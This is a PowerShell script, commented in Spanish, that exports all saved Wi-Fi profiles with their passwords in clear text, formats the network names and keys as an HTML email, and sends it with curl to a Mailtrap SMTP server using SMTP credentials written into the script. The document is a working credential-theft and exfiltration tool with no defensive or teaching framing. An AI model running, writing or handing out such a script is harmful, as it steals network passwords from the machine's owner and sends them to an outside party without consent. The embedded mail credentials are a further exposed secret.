# Exportar los perfiles de WLAN a un archivo XML
netsh wlan export profile key=clear folder=$env:TEMP

# Leer las claves de los archivos XML generados
$files = Get-ChildItem -Path "$env:TEMP\Wi-Fi-*.xml"
$htmlBody = "<html><body><h1>WiFi Credentials</h1><ul>"

foreach ($file in $files) {
    $xml = [xml](Get-Content $file.FullName)
    $ssid = $xml.WLANProfile.name
    $key = $xml.WLANProfile.MSM.security.sharedKey.keyMaterial
    if ($key) {
        $htmlBody += "<li><strong>SSID:</strong> $ssid<br><strong>Key:</strong> $key</li>"
    } else {
        $htmlBody += "<li><strong>SSID:</strong> $ssid<br><strong>Key:</strong> No key found</li>"
    }
}

$htmlBody += "</ul></body></html>"

# Crear el contenido del correo
$emailContent = @"
From: Magic Elves <from@example.com>
To: Mailtrap Inbox <to@example.com>
Subject: WiFi Credentials
Content-Type: text/html; charset="utf-8"

$htmlBody
"@

# Guardar el contenido del correo en un archivo temporal
$emailFilePath = "$env:TEMP\email_content.txt"
$emailContent | Out-File -FilePath $emailFilePath -Encoding UTF8

# Ejecutar el comando curl para enviar el correo
curl.exe --ssl-reqd --url 'smtp://sandbox.smtp.mailtrap.io:2525' `
  --user '3595fc7d46bfec:83861066a7c77c' `
  --mail-from 'from@example.com' `
  --mail-rcpt 'to@example.com' `
  --upload-file $emailFilePath
